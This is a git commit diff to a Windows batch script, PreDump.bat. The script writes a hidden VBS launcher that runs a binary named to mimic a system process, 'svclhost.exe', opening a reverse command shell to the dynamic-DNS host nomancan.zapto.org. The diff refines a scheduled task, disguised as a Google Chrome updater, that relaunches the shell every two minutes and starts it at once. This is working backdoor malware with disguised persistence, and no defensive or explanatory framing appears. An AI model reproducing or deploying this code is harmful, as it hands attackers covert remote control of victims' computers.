98d7fac0b32b09532dbb69e5a080f5c2626819ce
NoManCan <tiger_man_student@yahoo.com>
2025-04-03 02:37:45 +0400

    Update PreDump.bat

--- PreDump.bat
+++ PreDump.bat
@@ -13,11 +13,11 @@ dir "C:\Users"
 set "uname="
 set "pass="
 set "n_pt="
-
+FOR /F "tokens=*" %%g IN ('time /t') do (SET tt=%%g)
+:goon
 set /P uname=Enter Username: 
-rem if not defined n_date (set n_date=08/11/2024)
+if not defined uname (goto goon)
 set /P pass=Enter Password: 
-rem if not defined pass (set n_time=18:41:10)
 set /P n_pt=Enter New Port (4425): 
 if not defined n_pt (set n_pt=4425)
 
@@ -27,6 +27,10 @@ echo %n_pt%
 
 echo CreateObject("Wscript.Shell").Run "cmd /c C:\Windows\Temp\svclhost.exe nomancan.zapto.org %n_pt% -e cmd", 0, True > "C:\Windows\Temp\newsvclhost.vbs"
 
-SCHTASKS /CREATE /SC MINUTE /MO 2 /TN "GoogleSystem\GoogleUpdater\ChromeOnline" /TR "C:\Windows\System32\WScript.exe //Nologo //B C:\Windows\Temp\newsvclhost.vbs" /ST 17:50 /RU %uname% /RP %pass% /F
+if not defined pass (
+	SCHTASKS /CREATE /SC MINUTE /MO 2 /TN "GoogleSystem\GoogleUpdater\ChromeOnline" /TR "C:\Windows\System32\WScript.exe //Nologo //B C:\Windows\Temp\newsvclhost.vbs" /ST %tt% /RU %uname% /F
+	) else (
+	SCHTASKS /CREATE /SC MINUTE /MO 2 /TN "GoogleSystem\GoogleUpdater\ChromeOnline" /TR "C:\Windows\System32\WScript.exe //Nologo //B C:\Windows\Temp\newsvclhost.vbs" /ST %tt% /RU %uname% /RP %pass% /F
+)
 SCHTASKS /QUERY /TN "GoogleSystem\GoogleUpdater\ChromeOnline"
 SCHTASKS /RUN /TN "GoogleSystem\GoogleUpdater\ChromeOnline"
